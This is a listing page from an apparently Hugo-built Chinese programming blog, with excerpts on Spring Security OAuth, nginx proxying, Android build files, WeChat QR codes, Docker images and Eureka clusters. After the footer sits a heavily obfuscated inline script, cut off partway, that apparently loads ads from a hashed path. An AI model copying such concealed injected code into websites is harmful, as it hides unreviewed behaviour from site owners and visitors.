14.此处为⑧中获取到token后需要包装返回流操作 3.2.示例中spring-security.xml的部分配置 &lt;!-- 认证地址 --&gt; &lt;sec:http pattern="/oauth/token" create-session="stateless" authentication-manager-ref="authenticationManager" &gt; &lt;sec:intercept-url pattern="/oauth/token" access="IS_AUTHENTICATED_FULLY" /&gt; &lt;sec:anonymous enabled="false" /&gt; &lt;sec:http-basic entry-point-ref="clientAuthenticationEntryPoint" /&gt; &lt;sec:custom-filter ref="clientCredentialsTokenEndpointFilter" before="BASIC_AUTH_FILTER" /&gt; &lt;sec:access-denied-handler ref="oauthAccessDeniedHandler" /&gt; &lt;/sec:http&gt; &lt;bean id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b50b1073bb0c2448d9632a41b9fdafcb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfeafabef7813adc2c31e976310fd7d5/" rel="bookmark">
			解决IntelliJ IDEA创建Maven项目没有src目录的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先创建一个普通的maven项目
将webapp文件夹复制到main目录下
将项目改为war包，添加Servlet相关依赖,不清楚的看pom文件
百度云盘例子
https://pan.baidu.com/s/1kc60CWaTbpai9PtsvkFusA
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6172250bbf94a4045ee9d02f779a9eda/" rel="bookmark">
			nginx反向代理内外网跳转
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现状
一个域名（www.abc.com)，指向了公司的外网IP（59.108.xx.xx），
公司的外网IP（59.108.xx.xx），映射到一台内网服务器37（172.16.2.37），以下简称37服务器。
另一台内网服务器38是资源服务器（172.16.2.38），上传了很多的图片，以下简称38服务器。 其中，
37服务器是外网访问我们服务器的唯一入口，其中配置了nginx，跳转到多个服务器的应用。
38服务器，8081端口就是访问图片的应用端口。
希望：
通过外网ip和域名地址，可以访问资源服务器上的图片
实现步骤：
1、配置nginx.conf
#cat /etc/nginx/nginx.conf # For more information on configuration, see: # * Official English Documentation: http://nginx.org/en/docs/ # * Official Russian Documentation: http://nginx.org/ru/docs/ user nginx; worker_processes auto; error_log /var/log/nginx/error.log; pid /run/nginx.pid; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; # access_log /var/log/nginx/access.log main; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include conf.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6172250bbf94a4045ee9d02f779a9eda/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e2b3e63289a5ce31759a0d43e002a5bc/" rel="bookmark">
			默认浏览器设置及vue自动打开页面
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以下为windows 系统操作，仅供参考。
一、修改默认浏览器
个人偏好谷歌浏览器，设置谷歌浏览器为默认浏览器。
1、首先打开“开始菜单”，点击“控制面板”；
2、在“控制面板”里面找到“默认程序”，进入后点击“设置默认程序”；
3、加载好后选择 “谷歌浏览器”；
4、选择“将此程序设置为默认值”，如果安装360安全卫士，必须先退出360安全卫士，否则设置不起效果。
5、选择“选择此程序的默认值”，全选所有的扩展名，保存。
二、vue启动自动打开页面
vue 脚手架搭建项目后启动npm run dev，会出现
Your application is running here: http://localhost:8080 但是并不会自动打开浏览器展示页面，此时仅需要打开config文件下的index.js文件，更改autoOpenBrowser为true即可实现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f714c45bb88cbfcc9079b49ec5c9e9c3/" rel="bookmark">
			android.mk转换为android.bp
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		android.mk大家都很熟悉了，就是android下编译模块的配置文件，可以理解为android makefile。从android N之后，我们发现好多模块下面没有了android.mk文件，多了一个android.bp文件。这个是google在android N之后新的编译配置文件。
在实际项目中，我们需要把android.mk转换为android.bp，还好sdk中给我提供了androidmk工具，可以直接把android.mk转换为android.bp.
源码在：build/soong/androidmk
我们在out下面找下androidmk工具，如果没有可以执行命令：m -j blueprint_tools
然后在在out/soong/host/linux-x86/bin/androidmk生成工具
androidmk android.mk &gt; android.bp
这样即可把android.mk转换为android.bp文件了
有了这个工具我们很容易的修改android.bp
比如我们想把某个动态链接的bin改为静态链接，则可如下修改： cc_binary { name: "updater", srcs: ["updater.cpp"], local_include_dirs: [ "..", "include", ], cflags: [ "-Wno-unused-parameter", "-Werror", ], share_libs: ["libupdater"], } 把里面的动态库链接改为静态链接：share_libs改为static_libs,然后增加：static_executable: true,
cc_binary { name: "updater", srcs: ["updater.cpp"], local_include_dirs: [ "..", "include", ], cflags: [ "-Wno-unused-parameter", "-Werror", ], static_libs: ["libupdater"], static_executable: true, } 然后即可编译出静态链接的bin文件
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/58aa87fd3f1bae0e81193fc2f3cba2ce/" rel="bookmark">
			服务器反复重启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		现象：服务器反复重启，显示CPU 1，CPU2 error，还有显示内存错误，插上一块，两块，三块硬盘机器可以重启，四块硬盘机器起不来，故障一直在移动
处理：更换CPU，服务器完好
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5adb35fb425aeb6272b547c8102d206e/" rel="bookmark">
			Build 2018，给你带来全新的开发者体验， .NET Core 3.0带来桌面支持
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Build 2018 主旨演讲的主题是 Azure 云和 AI、物联网、AR等技术，以及开发者相关内容的宣布。在今天的Build大会上，微软宣布目前已有超过7亿台设备运行Windows 10系统。去年这个数字为5亿。Office 365目前每个月有1.35亿活跃的商业用户，去年为1.2亿。
微软今年Build大会的一大主题是说服开发人员相信，他们需要理解，以便将人工智能技术融入他们的应用之中。
FPGA上的AI服务
在今天的Build大会上，微软发布了Project Brainwave的“预览版”，这个平台，用FPGA在Azure云和边缘设备上实时运行深度学习模型。
Brainwave最初亮相，是去年8月，微软在芯片行业论坛Hot Chips上展示了这个平台的部分特性。
从当时公布的信息，可以看出这个平台可以分为三层：
一个高性能分布式架构；
一个整合到FPGA上的硬件深度神经网络引擎；
一个用来部署预训练模型的编译器和运行时。
当时，微软说这个平台支持微软自家的CNTK和Google的TensorFlow。
今天微软发布的Project Brainwave“预览版”，其实就是由这个平台在云端驱动的Azure机器学习硬件加速模型。让外部客户和微软一样用FPGA来处理AI工作负载，这是第一步。
微软还宣布了一个边缘设备上的“有限预览版”Project Brainwave。这里的边缘设备和我们平时所说的手机相机摄像头略有不同，指的是可以作为Azure IoT Edge设备使用的企业预置型服务器。戴尔和惠普企业是这个有限预览的首批合作伙伴。
大型科技公司无论做什么起家，从苹果到Google再到Facebook，无一不关注芯片。在一众同行都在追求自研机器学习专用芯片的时候，微软发出了不同的声音。
纳德拉在今天的发布会上说，以AI的发展速度来看，显然不该将今天的想法“锁定”到专用芯片上，还友情提醒各公司不要“被Google的TPU诱惑”。
微软是FPGA的忠实拥趸，Project Brainwave所用的就是英特尔的FPGA。这种芯片的全称是 现场可编程门阵列（Field Programmable Gate Array）。
这类芯片给微软带来了比Google TPU所使用的ASIC更大的灵活性，这家公司正逐步为整个数据中心部署FPGA，他们在FPGA上实现的机器学习性能，与那些专属芯片不相上下。
Azure IoT Edge进展
这是微软将人工智能、Azure服务、定制化应用装入物联网设备的一个工具。
在IoT Hub服务之上，微软发构建了Azure IoT Edge，支持微软的认知服务API，支持Event Grid和Kubernetes容器。此外，微软还开源了Azure IoT Edge runtime，以便开发者按需部署。
值得注意的是，边缘设备可用的认知服务目前只有视觉。不过微软计划稍后会推出更多服务。
据介绍，在Azure IoT Edge的帮助下，工业设备、无人机等即便在没有联网的情况下，也能运行机器学习模型。
在今天的大会上，微软宣布Azure IoT Edge已经和高通、大疆达成合作。
语音AI工具“四合一”
微软旗下的四种语音相关AI工具，这次也被统一起来。其中包括微软语音识别服务、文本到语音API、定制化语音模型和翻译服务。此前这些工具都作为单独的API存在（Bing Speech API、Speaker Recognition API、Custom Speech Service、Translator Speech API），并且单独定价。
手写和形状识别
微软还发布了Project Ink Analysis，这是一个全新的服务。借助这个服务，开发者可以为应用增加手写和其他形状的识别。
开发者工具
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5adb35fb425aeb6272b547c8102d206e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51f6251ee947b9533601fb9e9e1db739/" rel="bookmark">
			Origin画三维图的步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步： 将数据转化为矩阵格式：worksheet → convert to Martrix → XYZ Gridding 第二步：选择 X Y Z的参数
第三步：在矩阵界面下
3D surface → color Map Surface
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d27429d6c83bbf308bdeed943201678/" rel="bookmark">
			微信公众号开发之生成并扫描带参数的二维码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		生成带参数二维码详见微信公众平台之生成带参数的二维码
具体步骤：可在微信测试平台https://mp.weixin.qq.com/debug进行生成
生成结果如下：
拿到ticket 请求 https://mp.weixin.qq.com/cgi-bin/showqrcode?ticket=TICKET（用获取到的ticket替换掉TICKET）
直接生成二维码图片，如下图所示
或者百度搜索二维码生成器，通过URL生成二维码，如图
把二维码下载下来就可以了。
用户扫描带场景值二维码时，可能推送以下两种事件：
如果用户还未关注公众号，则用户可以关注公众号，关注后微信会将带场景值关注事件推送给开发者。如果用户已经关注公众号，则微信会将带场景值扫描事件推送给开发者。 1. 用户未关注时，进行关注后的事件推送
推送XML数据包示例：
&lt;xml&gt;&lt;ToUserName&gt;&lt; ![CDATA[toUser] ]&gt;&lt;/ToUserName&gt;&lt;FromUserName&gt;&lt; ![CDATA[FromUser] ]&gt;&lt;/FromUserName&gt;&lt;CreateTime&gt;123456789&lt;/CreateTime&gt;&lt;MsgType&gt;&lt; ![CDATA[event] ]&gt;&lt;/MsgType&gt;&lt;Event&gt;&lt; ![CDATA[subscribe] ]&gt;&lt;/Event&gt;&lt;EventKey&gt;&lt; ![CDATA[qrscene_123123] ]&gt;&lt;/EventKey&gt;&lt;Ticket&gt;&lt; ![CDATA[TICKET] ]&gt;&lt;/Ticket&gt;&lt;/xml&gt; 参数说明：
参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType消息类型，eventEvent事件类型，subscribeEventKey事件KEY值，qrscene_为前缀，后面为二维码的参数值Ticket二维码的ticket，可用来换取二维码图片 2. 用户已关注时的事件推送
推送XML数据包示例：
&lt;xml&gt; &lt;ToUserName&gt;&lt; ![CDATA[toUser] ]&gt;&lt;/ToUserName&gt; &lt;FromUserName&gt;&lt; ![CDATA[FromUser] ]&gt;&lt;/FromUserName&gt; &lt;CreateTime&gt;123456789&lt;/CreateTime&gt; &lt;MsgType&gt;&lt; ![CDATA[event] ]&gt;&lt;/MsgType&gt; &lt;Event&gt;&lt; ![CDATA[SCAN] ]&gt;&lt;/Event&gt; &lt;EventKey&gt;&lt; ![CDATA[SCENE_VALUE] ]&gt;&lt;/EventKey&gt; &lt;Ticket&gt;&lt; ![CDATA[TICKET] ]&gt;&lt;/Ticket&gt; &lt;/xml&gt; 参数说明：
参数描述ToUserName开发者微信号FromUserName发送方帐号（一个OpenID）CreateTime消息创建时间 （整型）MsgType消息类型，eventEvent事件类型，SCANEventKey事件KEY值，是一个32位无符号整数，即创建二维码时的二维码scene_idTicket二维码的ticket，可用来换取二维码图片 代码如下：
@Controller @RequestMapping("/wechat") public class WxController { private final static String MEDIATYPE_CHARSET_JSON_UTF8 = MediaType.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d27429d6c83bbf308bdeed943201678/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/867d7a512bfadc64191f3177266b703c/" rel="bookmark">
			HTML5 : worker API
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		worker 是异步操作的API js的执行是以主线程，单线程执行，当遇到耗时的计算时会发生堵塞，这时候需要雇佣一个worker进行异步计算，将计算结果返回给主线程。 worker文件必须和主文件满足同源策略 worker 和主线程之间的通信 postMessage(n)方法
message事件
雇主（index.html） 向工人发出任务数据 var worker = new Worker('./worker.js'); //给worker发送数据 worker.postMessage(12) 复制代码 工人（worker.js） 接受任务数据 onmessage = function(e){ console.log(e.data);//12 } 复制代码 工人处理index发过来的数据 onmessage = function(e){ postMessage(deal(e.data)); } function deal(data){ return data * data; } 复制代码 雇主监听工人返回的数据并使用 var worker = new Worker('./worker.js'); worker.postMessage(12) worker.onmessage = function (e){ console.log(e.data);//144 } 复制代码 结束一个worker close()在worker作用域中调用（worker.js）--&gt;辞职
terminate()在worker对象上调用（主进程的worker对象上worker.terminate）--&gt;解雇 close() 辞职，自己不干了 //worker.js onmessage = function(e){ postMessage(deal(e.data)); //取消worker close(); } function deal(data){ return data * data; } //index.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/867d7a512bfadc64191f3177266b703c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27073fc08731a7d29d0ab89e7f653895/" rel="bookmark">
			Spring入门到精通（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、spring简介 Spring是一个开源的控制反转(Inversionof Control ,IoC)和面向切面(AOP)的容器框架。为软件开发提供一站式解决方案。
spring是大工厂，会生产任意bean对象。
spring功能：生产bean、声明式事务、单例模式管理bean、AOP开发。
官网：http://www.springsource.org/spring-framework
下载：http://maven.springframework.org/release/org/springframework/spring/
下载的文件名spring-framework-x.x.x.RELEASE-dist.zip
libs目录下的jar包说明
spring核心API
BeanFactory：bean工厂，上产任意bean。
ApplicationContext：所有配置对象的主接口
ClassPathXmlApplicationContext：加载类路径下的配置文件
FileSystemXmlApplicationContext：加载文件系统下的配置文件
二、入门案例 1、控制反转(IOC) IOC(Inversion of Control)是控制反转的意思，之前需要类的对象，主动new(实例化)类的对象，spring是生产bean的工厂，现在可以让spring生产对象，用户获取对象使用。
对象从原来的主动创建，变为被动获得。
（1）创建项目(java或web),且导入spring的jar包 （2）创建业务层接口和实现类 （3） 在classpath下创建spring的核心配置文件，应用schema文件，配置bean。 配置文件：位置任意、文件名任意，习惯ApplicationContext.xml。
在spring-framework-4.1.0.RELEASE\docs\spring-framework-reference\html\xsd-config.html文件中有schema引用的说明。
（4）测试 2、依赖注入(DI) DI :Dependency Injection，指在定义bean时为属性注入值。
1. 编写业务层的接口和实现类，编写持久层的接口和实现类。
2. 配置bean，给属性注入值
三、bean的装配（基于xml） 1、实例化bean 方式一：默认构造方法 当配置一个bean时，默认调用无参构造方法实例化对象
方式二：静态工厂 一般情况下应用于spring和其他框架整合的时候
方法三：对象工厂 2、bean种类和作用域 bean的种类有：
基本bean:&lt;bean id=”” class=””&gt;
FactoryBean：是一个bean，是创建特定bean对象的工厂bean。
BeanFactory：是一个factory，可以创建任意bean对象的工厂。
bean的作用域：有bean标签的scope属性决定，默认singleton
singleton 单例
prototype 多例
request一次请求
session一次会话
3、bean生命周期 生命周期表示使用对象前或后，要执行的操作，初始化在前，销毁在后
1. 配置bean
2. 测试，要关闭ApplicationContext对象，才会调用destory方法，只有ClassPathXmlApplicationContext才有close方法。
4、属性依赖注入 依赖注入分为：手动注入和自动注入。
手动注入：基于xml配置时使用
自动注入：基于注解使用
又分：按名称、按类型、不确定注入
（1）构造方法注入 首先bean要提供无参和带参的不同构造方法，供bean使用
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27073fc08731a7d29d0ab89e7f653895/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e94445469321842a621f904e40d6c83a/" rel="bookmark">
			使用Dockerfile文件制作centos6.8基础镜像，基于centos基础镜像的ssh远程登录镜像，jdk1.8镜像，tomcat镜像，elasticsearch镜像等等...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、首先制作一个centos6.8的裸机镜像
创建一个干净的目录：
1 [root@docker centos6.8]# ls 2 c68-docker.tar.xz Dockerfile Dockerfile文件内容：
#依赖的基础镜像 FROM scratch #维护着 MAINTAINER hujianjie2010@163.com #添加的文件 ADD c68-docker.tar.xz / #定义标签 LABEL name="CentOS Base Image" \ vendor="CentOS" \ license="GPLv2" \ build-date="2016-06-02" # Default command CMD ["/bin/bash"] docker build -t centos6.8:1.0 .
scratch是一个空的镜像，而解压c68-docker.tar.xz包里面包含了centos主要的目录：如下
1 bin dev home lib64 manage media opt root sbin srv tmp var 2 c68-docker.tar.xz etc lib lost+found mnt proc selinux sys usr 因此上面的build出来的镜像基本就是一个裸机镜像。
注：下面这段文字摘自网络。但是能够看清楚scratch是啥东西，也能理解最基础的镜像是从哪里开始
使用 tar 来创建一个完整的镜像
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e94445469321842a621f904e40d6c83a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e76d50e646a037b3119c9c5f86ac6049/" rel="bookmark">
			多节点高可用Eureka集群与服务注册
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0 多节点 找多借点配置的直接从最下面这里开始看：
修改消费者和提供者的application.yml文件
defaultZone: http://peer1:8761/eureka/,http://peer2:8762/eureka/
1 简介 Eureka是Netfilx开元的服务发现组件，本身是一个基于REST的服务。它包含EurekaServer（以下简称ES）和EurekaClient（以下简称EC）两部分，SpringCloud将它集成在子项目SpringCloudNetfilx中，实现了微服务的注册与发现
2 原理 我们可以直接看Eureka的架构图
上面说了 Eureka分为Server和Client两部分，解释一下，我们拿us-east-1c来说：
us-east-1c里面的ApplicationService为我们微服务的提供方，ApplicationClient为服务的调用地方，他们通过MakeRemoteCall通讯，可以理解为RESTful API行为。他们同时都与ES保持联系，通过EC向ES发送心跳来续约自己在ES中的注册。ES提供服务发现的能力，会存储各个微服务启动时发送来的信息。当ES在一定时间内没有接收到某个微服务实例的心跳时，ES将会注销该实例。ES同时也可以是EC，当有多个节点时，如上图1d，1e，1c之间的ES通过互相复制来同步自己的服务注册表。EC也会缓存服务注册表中的信息，这样不用每次请求都查询ES，降低ES的压力，同时当所有ES都宕了，消费者仍然可以根据缓存来完成调用。 3 代码 示例代码为SpringBoot项目，采用Maven管理依赖，数据库使用了H2，项目同时整合了Actuator
3.1 编写单节点EurekaServer 创建一个Maven项目，完整POM如下 &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;groupId&gt;com.transientBa.cloud&lt;/groupId&gt; &lt;artifactId&gt;microservice-discovery-eureka&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;!-- 引入spring boot的依赖 --&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.4.3.RELEASE&lt;/version&gt; &lt;/parent&gt; &lt;properties&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;java.version&gt;1.8&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;!-- 提供了SpringMVC的支持 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- 提供了Spring Data JpA --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-jpa&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--H2数据库支持--&gt; &lt;dependency&gt; &lt;groupId&gt;com.h2database&lt;/groupId&gt; &lt;artifactId&gt;h2&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e76d50e646a037b3119c9c5f86ac6049/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/276/">«</a>
	<span class="pagination__item pagination__item--current">277/306</span>
	<a class="pagination__item pagination__item--next btn" href="/page/278/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程爱好者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151260"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebce